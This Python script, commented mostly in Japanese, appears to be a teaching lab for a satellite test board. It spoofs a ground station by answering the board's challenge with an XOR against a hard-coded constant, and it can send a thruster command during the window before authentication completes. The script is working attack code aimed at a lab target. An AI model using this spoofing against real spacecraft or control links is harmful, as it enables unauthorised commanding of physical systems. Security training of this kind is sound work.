#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""04_gs_auth_spoofing_usb.py -- 衛星が信頼している地上局になりすます。

ゲート（コマンドを通すかどうかを判定する関門）のチャレンジレスポンスは、
地上局ソフトウェアに同梱された定数との排他的論理和（XOR）1 回だけでできている。
チャレンジレスポンスとは、相手が出した数（チャレンジ）に正しい答え
（レスポンス）を返せるかどうかで相手を確かめる方式である。

    response = challenge ^ 0xC0DEFACE

コンソール（地上局ソフトウェア）を持っている人は、誰でも鍵を持っていることになる。
このやり取りで証明できるのは「相手が計算できること」だけで、「名乗っている
とおりの地上局であること」ではない。

もう 1 つの弱点は順序である。ハンドシェイク（認証のやり取り）を進めるために
先にセッション（認証済みとしてコマンドを受け付ける期間）が開かれ、本人確認が終わる前のその時間帯にもコマンドが
受け付けられてしまう。どの手順も単独ではレビューを通る。欠陥は順序にある。

期待される結果: ボードが信頼するよう設定されたことのないコンソールから
セッションが開かれ、その中でコマンドが受け付けられる。
"""

import argparse
import struct
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

from flatsat import (FlatSat, GS_AUTH_KEY, TC_GS_ACCESS, TC_GS_STATUS,  # noqa: E402
                     TC_SET_THRUSTER, gs_response)


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--port", default=None)
    ap.add_argument("--auth-key", type=lambda x: int(x, 0), default=GS_AUTH_KEY)
    ap.add_argument("--seq", type=int, default=1)
    ap.add_argument("--inside-window", action="store_true",
                    help="send a command between the open and the verify")
    ap.add_argument("--cleartext", action="store_true")
    args = ap.parse_args()

    with FlatSat(port=args.port, encrypt=not args.cleartext) as fsat:
        print("\n=== 1. gate status before ===")
        fsat.send(TC_GS_STATUS, b"", seq=args.seq, listen=1.2)

        print("\n=== 2. start the handshake. This opens a session ===")
        replies = fsat.send(TC_GS_ACCESS, b"\x00", seq=args.seq + 1, listen=1.5)

        challenge = None
        refusal = None
        for p in replies:
            body = fsat.plaintext(p)
            if p.apid == 0x09:
                refusal = body.split(b"\x00", 1)[0].decode("ascii", "replace").strip()
                print(f"[!] the board refused: {refusal}")
            # チャレンジは 6〜9 オクテット目（オクテット = 8 ビット、1 バイト）に
            # リトルエンディアン（下位バイトが先に並ぶ順序）で入っている。
            # その前には衛星 ID、フェーズ、認証状態、ステータス 2 オクテットが並ぶ。
            # 以前は 1〜4 オクテット目をビッグエンディアンとして読んでいたため、
            # ボードが発行していない数に答えてしまい、ハンドシェイクが失敗して
            # 演習から何も学べなかった。2026年11月7日に実機で
            # telemetrySPPTransmitGroundAccessStatus() と突き合わせて確認済み。
            if p.apid == TC_GS_ACCESS and len(body) >= 9:
                challenge = struct.unpack_from("<I", body, 5)[0]
                print(f"[*] challenge: 0x{challenge:08X}")
        # ゼロのチャレンジはチャレンジではない。ゲートは本人確認より先に
        # 距離を確認する（worker.cpp:466-482）。そのため地上局の半径の外にいる
        # ボードは手前の段階で拒否し、チャレンジを発行しない。
        # None だけを判定していたころは、誰も出していない数に答えたうえで、
        # 成功したかのように最後のメッセージを表示していた。
        if challenge is None or challenge == 0:
            if challenge == 0:
                print("[!] the challenge came back as zero, so no session was "
                      "opened.")
            else:
                print("[!] no challenge came back.")
            if refusal:
                print(f"[!] the board already told you why: {refusal}")
            print("\nThe gate checks three things in order: that the GPS fix "
                  "is usable, that you are inside the station's radius, and "
                  "only then that a session exists.")
            print("  GS GPS INVALID    no usable fix")
            print("  GS RANGE LOCK     outside the radius. The course build "
                  "starts in Tokyo and the station is in Sapporo, which is "
                  "about 830 km outside the 35 km it allows. Spoof the "
                  "position into range first, with lab 2.3, and come back")
            print("  GS AUTH REQUIRED  in range, no session. This lab's step")
            print("  ground-station mode off  nothing to open at all")
            return 1

        if args.inside_window:
            print("\n=== 2b. the window: a command before identity is established ===")
            fsat.send(TC_SET_THRUSTER, bytes([0, 0x40]), seq=args.seq + 2, listen=1.0)
            print("[*] If that was accepted, the ordering is the finding, not the key.")

        print("\n=== 3. answer it. One exclusive-or, with a constant we have ===")
        resp = gs_response(challenge, args.auth_key)
        print(f"[*] response: 0x{resp:08X}  (challenge ^ 0x{args.auth_key:08X})")
        fsat.send(TC_GS_ACCESS, b"\x01" + resp.to_bytes(4, "big"),
                  seq=args.seq + 3, listen=1.5)

        print("\n=== 4. gate status after ===")
        fsat.send(TC_GS_STATUS, b"", seq=args.seq + 4, listen=1.2)

    print("\nMark the exact step at which the correct order would have stopped "
          "you.\nThat, not the key, is the deliverable of this lab.")
    print("\nWhat the sensor should have shown: a critical command accepted "
          "before the ground-station exchange completed.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
